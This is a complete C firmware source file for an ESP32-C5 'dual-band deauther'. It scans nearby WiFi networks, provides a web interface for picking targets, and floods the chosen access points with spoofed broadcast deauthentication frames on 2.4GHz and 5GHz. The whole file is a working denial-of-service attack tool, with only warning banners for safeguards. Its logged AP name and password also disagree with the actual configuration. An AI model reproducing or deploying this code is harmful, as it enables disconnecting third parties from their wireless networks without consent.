// main.c - ESP32-C5 Dual-Band Deauther (2.4GHz + 5GHz simultaneous)
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/time.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_timer.h"
#include "esp_event.h"
#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_system.h"
#include "esp_http_server.h"
#include "cJSON.h"
#include <ctype.h>

static const char *TAG = "deauther";

// Target structure
typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    uint8_t channel;
    uint32_t packets_sent;
    bool active;
} attack_target_t;

// Global state
static bool attack_running = false;
static attack_target_t target_24ghz = {0};  // 2.4GHz target
static attack_target_t target_5ghz = {0};   // 5GHz target
static uint32_t attack_duration = 0;
static uint32_t attack_start_time = 0;
static TaskHandle_t attack_task_handle = NULL;
static httpd_handle_t server = NULL;

/* --- Deauth Frame Structure --- */
typedef struct {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t da[6];
    uint8_t sa[6];
    uint8_t bssid[6];
    uint8_t seq[2];
    uint8_t reason[2];
} __attribute__((packed)) deauth_frame_simple_t;

/* --- Get current time in seconds --- */
static uint32_t get_time_sec(void)
{
    return (uint32_t)(esp_timer_get_time() / 1000000ULL);
}

/* --- Fast deauth send --- */
static inline void send_deauth_fast(uint8_t *ap_mac, uint16_t reason)
{
    static uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    deauth_frame_simple_t frame;
    
    frame.frame_ctrl[0] = 0xC0;
    frame.frame_ctrl[1] = 0x00;
    frame.duration[0] = 0x00;
    frame.duration[1] = 0x00;
    
    memcpy(frame.da, broadcast, 6);
    memcpy(frame.sa, ap_mac, 6);
    memcpy(frame.bssid, ap_mac, 6);
    
    frame.seq[0] = 0x00;
    frame.seq[1] = 0x00;
    frame.reason[0] = reason & 0xFF;
    frame.reason[1] = (reason >> 8) & 0xFF;
    
    esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
}

/* --- Aggressive deauth burst for one target --- */
static uint32_t send_deauth_burst(attack_target_t *target)
{
    if (!target->active) return 0;
    
    static uint16_t reasons[] = {0x0001, 0x0003, 0x0006, 0x0007, 0x0008};
    uint32_t sent = 0;
    
    // Set channel
    esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
    
    // Send burst of 10 frames with different reason codes
    for (int i = 0; i < 10; i++) {
        send_deauth_fast(target->bssid, reasons[i % 5]);
        sent++;
    }
    
    return sent;
}

/* --- Restore AP Mode --- */
static void restore_ap_mode(void)
{
    ESP_LOGI(TAG, "🔄 Restoring AP mode...");
    
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "Free wifi",
            .ssid_len = strlen("Free wifi"),
            .password = "24446666688888888",
            .channel = 1,
            .max_connection = 4,
            .authmode = WIFI_AUTH_WPA2_PSK,
            .pmf_cfg = {.required = false},
        },
    };

    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    
    if (server) {
        ESP_LOGI(TAG, "✅ Web interface restored at http://192.168.4.1/");
    }
}

/* --- Dual-Band Attack Task --- */
static void dual_band_attack_task(void *pvParameters)
{
    ESP_LOGI(TAG, "");
    ESP_LOGI(TAG, "╔════════════════════════════════════════╗");
    ESP_LOGI(TAG, "║   DUAL-BAND DEAUTH ATTACK STARTED     ║");
    ESP_LOGI(TAG, "╚════════════════════════════════════════╝");
    
    if (target_24ghz.active) {
        ESP_LOGI(TAG, "📡 2.4GHz Target: %s", target_24ghz.ssid);
        ESP_LOGI(TAG, "   BSSID: %02X:%02X:%02X:%02X:%02X:%02X | CH: %d",
                 target_24ghz.bssid[0], target_24ghz.bssid[1], target_24ghz.bssid[2],
                 target_24ghz.bssid[3], target_24ghz.bssid[4], target_24ghz.bssid[5],
                 target_24ghz.channel);
    }
    
    if (target_5ghz.active) {
        ESP_LOGI(TAG, "📡 5GHz Target: %s", target_5ghz.ssid);
        ESP_LOGI(TAG, "   BSSID: %02X:%02X:%02X:%02X:%02X:%02X | CH: %d",
                 target_5ghz.bssid[0], target_5ghz.bssid[1], target_5ghz.bssid[2],
                 target_5ghz.bssid[3], target_5ghz.bssid[4], target_5ghz.bssid[5],
                 target_5ghz.channel);
    }
    
    ESP_LOGI(TAG, "⏱️  Duration: %lu seconds", attack_duration);
    ESP_LOGI(TAG, "🔥 Mode: DUAL-BAND RAPID SWITCHING");
    ESP_LOGI(TAG, "");
    
    // Switch to STA only mode
    ESP_LOGI(TAG, "🔌 Switching to STA mode (AP disabled)...");
    esp_wifi_set_mode(WIFI_MODE_STA);
    vTaskDelay(pdMS_TO_TICKS(500));
    
    attack_start_time = get_time_sec();
    target_24ghz.packets_sent = 0;
    target_5ghz.packets_sent = 0;
    uint32_t last_log_time = 0;
    uint32_t cycle_count = 0;
    
    ESP_LOGI(TAG, "💥 DUAL ATTACK STARTED - RAPID BAND SWITCHING!");
    ESP_LOGI(TAG, "");
    
    // MAIN ATTACK LOOP - Fast switching between bands
    while (attack_running) {
        uint32_t elapsed = get_time_sec() - attack_start_time;
        
        // Check duration
        if (elapsed >= attack_duration) {
            ESP_LOGI(TAG, "⏰ Attack duration expired!");
            break;
        }
        
        // Attack 2.4GHz band (10 packets)
        if (target_24ghz.active) {
            uint32_t sent = send_deauth_burst(&target_24ghz);
            target_24ghz.packets_sent += sent;
        }
        
        // Tiny delay for channel switch to settle
        vTaskDelay(pdMS_TO_TICKS(5));
        
        // Attack 5GHz band (10 packets)
        if (target_5ghz.active) {
            uint32_t sent = send_deauth_burst(&target_5ghz);
            target_5ghz.packets_sent += sent;
        }
        
        // Minimal delay before next cycle
        vTaskDelay(pdMS_TO_TICKS(5));
        
        cycle_count++;
        
        // Log every 2 seconds
        if (elapsed - last_log_time >= 2) {
            last_log_time = elapsed;
            uint32_t remaining = attack_duration - elapsed;
            uint32_t total_packets = target_24ghz.packets_sent + target_5ghz.packets_sent;
            float total_pps = (float)total_packets / (float)(elapsed > 0 ? elapsed : 1);
            
            ESP_LOGI(TAG, "💥 [%2lu/%2lu sec] Total: %6lu pkt | PPS: %4.0f | Cycles: %lu | Remaining: %2lu sec",
                     elapsed, attack_duration, total_packets, total_pps, cycle_count, remaining);
            
            if (target_24ghz.active) {
                float pps_24 = (float)target_24ghz.packets_sent / (float)(elapsed > 0 ? elapsed : 1);
                ESP_LOGI(TAG, "   📻 2.4GHz: %6lu pkt (%4.0f pps)", target_24ghz.packets_sent, pps_24);
            }
            if (target_5ghz.active) {
                float pps_5 = (float)target_5ghz.packets_sent / (float)(elapsed > 0 ? elapsed : 1);
                ESP_LOGI(TAG, "   📻 5GHz:   %6lu pkt (%4.0f pps)", target_5ghz.packets_sent, pps_5);
            }
            ESP_LOGI(TAG, "");
        }
    }
    
    ESP_LOGI(TAG, "");
    ESP_LOGI(TAG, "╔════════════════════════════════════════╗");
    ESP_LOGI(TAG, "║      DUAL-BAND ATTACK COMPLETED       ║");
    ESP_LOGI(TAG, "╚════════════════════════════════════════╝");
    
    uint32_t total_time = get_time_sec() - attack_start_time;
    uint32_t total_packets = target_24ghz.packets_sent + target_5ghz.packets_sent;
    float avg_pps = (float)total_packets / (float)(total_time > 0 ? total_time : 1);
    float switch_rate = (float)cycle_count / (float)(total_time > 0 ? total_time : 1);
    
    ESP_LOGI(TAG, "📊 STATISTICS:");
    ESP_LOGI(TAG, "   Total packets: %lu", total_packets);
    ESP_LOGI(TAG, "   Total time: %lu seconds", total_time);
    ESP_LOGI(TAG, "   Average PPS: %.0f packets/sec", avg_pps);
    ESP_LOGI(TAG, "   Band switches: %lu cycles (%.1f/sec)", cycle_count, switch_rate);
    ESP_LOGI(TAG, "");
    
    if (target_24ghz.active) {
        float pps_24 = (float)target_24ghz.packets_sent / (float)total_time;
        ESP_LOGI(TAG, "📻 2.4GHz: %lu packets (%.0f pps)", target_24ghz.packets_sent, pps_24);
    }
    if (target_5ghz.active) {
        float pps_5 = (float)target_5ghz.packets_sent / (float)total_time;
        ESP_LOGI(TAG, "📻 5GHz:   %lu packets (%.0f pps)", target_5ghz.packets_sent, pps_5);
    }
    
    ESP_LOGI(TAG, "");
    ESP_LOGI(TAG, "💪 Effectiveness: %s", 
             avg_pps > 800 ? "EXCELLENT" : avg_pps > 400 ? "GOOD" : "MODERATE");
    ESP_LOGI(TAG, "");
    
    attack_running = false;
    
    // Restore AP mode
    restore_ap_mode();
    
    ESP_LOGI(TAG, "✅ Ready for next attack. Reconnect to ESP32-Deauther WiFi.");
    
    attack_task_handle = NULL;
    vTaskDelete(NULL);
}

/* --- Start Dual-Band Attack --- */
static bool start_dual_band_attack(uint32_t duration)
{
    if (attack_running) {
        ESP_LOGW(TAG, "⚠️  Attack already running");
        return false;
    }
    
    if (!target_24ghz.active && !target_5ghz.active) {
        ESP_LOGW(TAG, "⚠️  No targets selected");
        return false;
    }
    
    attack_duration = duration;
    attack_running = true;
    
    xTaskCreate(dual_band_attack_task, "dual_attack", 8192, NULL, 5, &attack_task_handle);
    return true;
}

/* --- WiFi init (AP mode initially) --- */
static void wifi_init_ap(void)
{
    esp_netif_init();
    esp_event_loop_create_default();
    esp_netif_create_default_wifi_ap();
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);

    wifi_config_t ap_config = {
        .ap = {
            .ssid = "free wifi",
            .ssid_len = strlen("free wifi"),
            .password = "2444666668888888",
            .channel = 1,
            .max_connection = 4,
            .authmode = WIFI_AUTH_WPA2_PSK,
            .pmf_cfg = {.required = false},
        },
    };

    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    esp_wifi_start();
    
    ESP_LOGI(TAG, "");
    ESP_LOGI(TAG, "╔════════════════════════════════════════╗");
    ESP_LOGI(TAG, "║   ESP32-C5 DUAL-BAND DEAUTHER         ║");
    ESP_LOGI(TAG, "╚════════════════════════════════════════╝");
    ESP_LOGI(TAG, "📡 SSID: ESP32-Deauther");
    ESP_LOGI(TAG, "🔑 Password: 12345678");
    ESP_LOGI(TAG, "🌐 Web Interface: http://192.168.4.1/");
    ESP_LOGI(TAG, "⚡ Mode: Simultaneous 2.4GHz + 5GHz");
    ESP_LOGI(TAG, "⚠️  USE ONLY ON YOUR OWN NETWORKS!");
    ESP_LOGI(TAG, "");
}

/* --- WiFi Scan --- */
static char* wifi_scan_get_json(int *out_len)
{
    wifi_scan_config_t scan_config = {
        .ssid = 0,
        .bssid = 0,
        .channel = 0,
        .show_hidden = true
    };
    
    ESP_LOGI(TAG, "🔍 Starting WiFi scan (2.4GHz + 5GHz)...");
    esp_err_t err = esp_wifi_scan_start(&scan_config, true);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "❌ Scan failed: %d", err);
        *out_len = 0;
        return NULL;
    }

    uint16_t ap_num = 0;
    esp_wifi_scan_get_ap_num(&ap_num);
    ESP_LOGI(TAG, "✅ Found %d networks", ap_num);
    
    wifi_ap_record_t *ap_info = calloc(ap_num, sizeof(wifi_ap_record_t));
    if (!ap_info) {
        *out_len = 0;
        return NULL;
    }
    esp_wifi_scan_get_ap_records(&ap_num, ap_info);

    cJSON *arr = cJSON_CreateArray();
    for (int i = 0; i < ap_num; ++i) {
        cJSON *obj = cJSON_CreateObject();
        cJSON_AddStringToObject(obj, "ssid", (char*)ap_info[i].ssid);
        cJSON_AddNumberToObject(obj, "rssi", ap_info[i].rssi);
        cJSON_AddNumberToObject(obj, "channel", ap_info[i].primary);
        const char *band = (ap_info[i].primary <= 14) ? "2.4GHz" : "5GHz";
        cJSON_AddStringToObject(obj, "band", band);
        char bssid_str[20];
        sprintf(bssid_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                ap_info[i].bssid[0], ap_info[i].bssid[1], ap_info[i].bssid[2],
                ap_info[i].bssid[3], ap_info[i].bssid[4], ap_info[i].bssid[5]);
        cJSON_AddStringToObject(obj, "bssid", bssid_str);
        cJSON_AddItemToArray(arr, obj);
    }

    char *out = cJSON_PrintUnformatted(arr);
    *out_len = strlen(out);
    cJSON_Delete(arr);
    free(ap_info);
    return out;
}

/* --- HTTP Handlers --- */

static esp_err_t root_get_handler(httpd_req_t *req)
{
    const char* html =
    "<!doctype html><html><head><meta charset='utf-8'><title>ESP32-C5 Dual-Band Deauther</title>"
    "<style>"
    "body{font-family:'Segoe UI',Arial;margin:0;padding:20px;background:#1a1a1a;color:#fff}"
    "h2{color:#00ff88;text-shadow:0 0 10px #00ff88}"
    ".container{max-width:1200px;margin:0 auto}"
    ".warning{background:#ff4444;padding:15px;border-radius:8px;margin:20px 0;font-weight:bold}"
    ".info{background:#2196F3;padding:15px;border-radius:8px;margin:20px 0}"
    "table{border-collapse:collapse;width:100%;margin:20px 0;background:#2a2a2a;border-radius:8px;overflow:hidden}"
    "th,td{border:1px solid #444;padding:12px;text-align:left}"
    "th{background:#00ff88;color:#000;font-weight:bold}"
    "tr:hover{background:#333}"
    "tr.selected-24{background:#1565C0 !important}"
    "tr.selected-5{background:#E65100 !important}"
    "button{padding:10px 20px;margin:5px;cursor:pointer;border:none;border-radius:5px;font-weight:bold;transition:all 0.3s}"
    ".scan{background:#2196F3;color:white}.scan:hover{background:#1976D2;transform:scale(1.05)}"
    ".select-24{background:#2196F3;color:white}.select-24:hover{background:#1565C0}"
    ".select-5{background:#ff9800;color:white}.select-5:hover{background:#E65100}"
    ".attack{background:#00ff88;color:#000;font-size:16px;padding:15px 30px}.attack:hover{background:#00cc70;transform:scale(1.05)}"
    ".status{margin:20px 0;padding:15px;border-radius:8px;font-weight:bold}"
    ".success{background:#00ff88;color:#000}"
    ".error{background:#ff4444;color:#fff}"
    "input[type=number]{padding:8px;width:80px;background:#333;border:1px solid #666;color:#fff;border-radius:4px}"
    ".band-24{color:#2196F3;font-weight:bold}"
    ".band-5{color:#ff9800;font-weight:bold}"
    ".target-box{display:inline-block;margin:10px;padding:15px;border-radius:8px;min-width:250px}"
    ".target-24{background:#1565C0;border:2px solid #2196F3}"
    ".target-5{background:#E65100;border:2px solid #ff9800}"
    "</style></head><body>"
    "<div class='container'>"
    "<h2>🔥 ESP32-C5 Dual-Band WiFi Deauther</h2>"
    "<div class='warning'>⚠️ WARNING: Use ONLY on YOUR OWN networks for testing! Illegal otherwise!</div>"
    "<div class='info'>💡 Select ONE 2.4GHz target AND/OR ONE 5GHz target, then start attack</div>"
    "<button class='scan' onclick='doScan()'>🔍 Scan Networks</button>"
    "<div id='targets'></div>"
    "<div id='controls' style='display:none'>"
    "  <h3>⚙️ Attack Configuration</h3>"
    "  Duration: <input type='number' id='duration' value='30' min='10' max='600'> seconds<br><br>"
    "  <button class='attack' onclick='startDualAttack()'>⚡ START DUAL-BAND ATTACK</button>"
    "</div>"
    "<div id='status'></div>"
    "<div id='out'></div>"
    "</div>"
    "<script>"
    "let selected24=null,selected5=null,networks=[];"
    "function showTargets(){"
    "  let html='';"
    "  if(selected24){"
    "    html+=`<div class='target-box target-24'><strong>📻 2.4GHz Target</strong><br>${selected24.ssid}<br><code>${selected24.bssid}</code><br>CH: ${selected24.channel}</div>`;"
    "  }"
    "  if(selected5){"
    "    html+=`<div class='target-box target-5'><strong>📻 5GHz Target</strong><br>${selected5.ssid}<br><code>${selected5.bssid}</code><br>CH: ${selected5.channel}</div>`;"
    "  }"
    "  document.getElementById('targets').innerHTML=html;"
    "  document.getElementById('controls').style.display=(selected24||selected5)?'block':'none';"
    "}"
    "function select24(idx){"
    "  selected24=networks[idx];"
    "  showTargets();"
    "  updateTable();"
    "}"
    "function select5(idx){"
    "  selected5=networks[idx];"
    "  showTargets();"
    "  updateTable();"
    "}"
    "function updateTable(){"
    "  let html='<table><tr><th>#</th><th>SSID</th><th>RSSI</th><th>Channel</th><th>Band</th><th>BSSID</th><th>Select As</th></tr>';"
    "  networks.forEach((ap,i)=>{"
    "    let rowClass='';"
    "    if(selected24&&ap.bssid===selected24.bssid)rowClass='selected-24';"
    "    if(selected5&&ap.bssid===selected5.bssid)rowClass='selected-5';"
    "    let bandClass=ap.band==='2.4GHz'?'band-24':'band-5';"
    "    html+=`<tr class='${rowClass}'><td>${i+1}</td><td><strong>${ap.ssid||'(hidden)'}</strong></td><td>${ap.rssi} dBm</td>`;"
    "    html+=`<td>${ap.channel}</td><td class='${bandClass}'>${ap.band}</td><td><code>${ap.bssid}</code></td>`;"
    "    html+=`<td>`;"
    "    if(ap.band==='2.4GHz')html+=`<button class='select-24' onclick='select24(${i})'>📻 2.4GHz</button>`;"
    "    if(ap.band==='5GHz')html+=`<button class='select-5' onclick='select5(${i})'>📻 5GHz</button>`;"
    "    html+=`</td></tr>`;"
    "  });"
    "  html+='</table>';"
    "  document.getElementById('out').innerHTML=html;"
    "}"
    "async function doScan(){"
    "  document.getElementById('out').innerHTML='<p style=\"color:#00ff88\">⏳ Scanning...</p>';"
    "  try{"
    "    let r=await fetch('/scan');"
    "    networks=await r.json();"
    "    updateTable();"
    "  }catch(e){"
    "    document.getElementById('out').innerHTML='<p class=\"error\">❌ Scan failed: '+e+'</p>';"
    "  }"
    "}"
    "async function startDualAttack(){"
    "  if(!selected24&&!selected5){alert('Select at least one target!');return;}"
    "  let duration=document.getElementById('duration').value;"
    "  let msg='Start attack?\\n\\n';"
    "  if(selected24)msg+=`2.4GHz: ${selected24.ssid} (${selected24.bssid})\\n`;"
    "  if(selected5)msg+=`5GHz: ${selected5.ssid} (${selected5.bssid})\\n`;"
    "  msg+=`\\nDuration: ${duration}s\\n\\n⚠️ USE ONLY ON YOUR NETWORK!`;"
    "  if(!confirm(msg))return;"
    "  try{"
    "    let body={duration:parseInt(duration)};"
    "    if(selected24)body.target_24ghz={ssid:selected24.ssid,bssid:selected24.bssid,channel:selected24.channel};"
    "    if(selected5)body.target_5ghz={ssid:selected5.ssid,bssid:selected5.bssid,channel:selected5.channel};"
    "    let r=await fetch('/attack/dual',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});"
    "    let txt=await r.text();"
    "    document.getElementById('status').innerHTML=`<div class='status success'>✅ ${txt}<br>⚠️ AP disabled. Check Serial Monitor.<br>🔄 AP auto-restores after ${duration}s</div>`;"
    "    setTimeout(()=>{"
    "      document.getElementById('status').innerHTML='<div class=\"status success\">✅ Attack completed! Reconnect to ESP32-Deauther WiFi.</div>';"
    "    },duration*1000+2000);"
    "  }catch(e){"
    "    document.getElementById('status').innerHTML='<div class=\"status error\">❌ Failed: '+e+'</div>';"
    "  }"
    "}"
    "</script>"
    "</body></html>";
    httpd_resp_send(req, html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t scan_get_handler(httpd_req_t *req)
{
    int len = 0;
    char *json = wifi_scan_get_json(&len);
    if (!json) {
        httpd_resp_set_status(req, "500 Internal Server Error");
        httpd_resp_sendstr(req, "{\"error\":\"scan failed\"}");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, json, len);
    free(json);
    return ESP_OK;
}

static esp_err_t attack_dual_handler(httpd_req_t *req)
{
    char buf[1024];
    int ret = httpd_req_recv(req, buf, sizeof(buf)-1);
    if (ret <= 0) {
        httpd_resp_sendstr(req, "No data");
        return ESP_FAIL;
    }
    buf[ret] = 0;
    
    cJSON *root = cJSON_Parse(buf);
    if (!root) {
        httpd_resp_sendstr(req, "Bad JSON");
        return ESP_FAIL;
    }
    
    // Reset targets
    target_24ghz.active = false;
    target_5ghz.active = false;
    
    // Parse 2.4GHz target
    cJSON *t24 = cJSON_GetObjectItem(root, "target_24ghz");
    if (t24) {
        cJSON *ssid = cJSON_GetObjectItem(t24, "ssid");
        cJSON *bssid = cJSON_GetObjectItem(t24, "bssid");
        cJSON *channel = cJSON_GetObjectItem(t24, "channel");
        
        if (cJSON_IsString(ssid) && cJSON_IsString(bssid) && cJSON_IsNumber(channel)) {
            strncpy(target_24ghz.ssid, ssid->valuestring, sizeof(target_24ghz.ssid) - 1);
            if (sscanf(bssid->valuestring, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                       &target_24ghz.bssid[0], &target_24ghz.bssid[1], &target_24ghz.bssid[2],
                       &target_24ghz.bssid[3], &target_24ghz.bssid[4], &target_24ghz.bssid[5]) == 6) {
                target_24ghz.channel = (uint8_t)channel->valueint;
                target_24ghz.active = true;
            }
        }
    }
    
    // Parse 5GHz target
    cJSON *t5 = cJSON_GetObjectItem(root, "target_5ghz");
    if (t5) {
        cJSON *ssid = cJSON_GetObjectItem(t5, "ssid");
        cJSON *bssid = cJSON_GetObjectItem(t5, "bssid");
        cJSON *channel = cJSON_GetObjectItem(t5, "channel");
        
        if (cJSON_IsString(ssid) && cJSON_IsString(bssid) && cJSON_IsNumber(channel)) {
            strncpy(target_5ghz.ssid, ssid->valuestring, sizeof(target_5ghz.ssid) - 1);
            if (sscanf(bssid->valuestring, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                       &target_5ghz.bssid[0], &target_5ghz.bssid[1], &target_5ghz.bssid[2],
                       &target_5ghz.bssid[3], &target_5ghz.bssid[4], &target_5ghz.bssid[5]) == 6) {
                target_5ghz.channel = (uint8_t)channel->valueint;
                target_5ghz.active = true;
            }
        }
    }
    
    // Parse duration
    cJSON *duration_json = cJSON_GetObjectItem(root, "duration");
    if (!cJSON_IsNumber(duration_json)) {
        httpd_resp_sendstr(req, "Invalid duration");
        cJSON_Delete(root);
        return ESP_FAIL;
    }
    
    uint32_t duration = (uint32_t)duration_json->valueint;
    
    if (start_dual_band_attack(duration)) {
        httpd_resp_sendstr(req, "Dual-band attack started! Check Serial Monitor for detailed logs.");
    } else {
        httpd_resp_sendstr(req, "Failed to start attack");
    }
    
    cJSON_Delete(root);
    return ESP_OK;
}

static httpd_uri_t root_uri = {.uri = "/", .method = HTTP_GET, .handler = root_get_handler};
static httpd_uri_t scan_uri = {.uri = "/scan", .method = HTTP_GET, .handler = scan_get_handler};
static httpd_uri_t attack_dual_uri = {.uri = "/attack/dual", .method = HTTP_POST, .handler = attack_dual_handler};

static httpd_handle_t start_webserver(void)
{
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.max_uri_handlers = 8;
    config.lru_purge_enable = true;

    if (httpd_start(&server, &config) == ESP_OK) {
        httpd_register_uri_handler(server, &root_uri);
        httpd_register_uri_handler(server, &scan_uri);
        httpd_register_uri_handler(server, &attack_dual_uri);
        ESP_LOGI(TAG, "✅ Web server started");
    }
    return server;
}

void app_main(void)
{
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        nvs_flash_erase();
        nvs_flash_init();
    }
    
    ESP_LOGI(TAG, "");
    ESP_LOGI(TAG, "╔════════════════════════════════════════╗");
    ESP_LOGI(TAG, "║   ESP32-C5 Dual-Band Deauther v3.0    ║");
    ESP_LOGI(TAG, "║   Simultaneous 2.4GHz + 5GHz Attack   ║");
    ESP_LOGI(TAG, "╚════════════════════════════════════════╝");
    ESP_LOGI(TAG, "");
    
    wifi_init_ap();
    start_webserver();

    while (1) {
        vTaskDelay(pdMS_TO_TICKS(10000));
    }
}